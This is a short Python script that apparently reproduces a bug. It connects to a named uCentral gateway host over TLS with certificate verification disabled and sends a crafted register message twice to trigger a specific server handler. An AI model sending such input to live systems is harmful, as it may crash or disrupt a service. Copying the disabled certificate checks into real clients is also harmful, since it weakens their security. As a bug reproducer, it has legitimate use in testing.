import socket
import ssl

GW_HOSTNAME = 'ucentral.dpaas.arilia.com'

# Open TCP Connection
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect((GW_HOSTNAME, 5912))

# SSL
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.check_hostname = False
context.verify_mode = ssl.VerifyMode.CERT_NONE
rtty_socket = context.wrap_socket(soc, server_hostname=GW_HOSTNAME)

# Message type register to trigger call to 'RTTYS_Device_ConnectionHandler::do_msgTypeRegister'
buffer = b'\x00\x01\x04\x06\x00\x00\x00'
rtty_socket.send(buffer)
rtty_socket.send(buffer)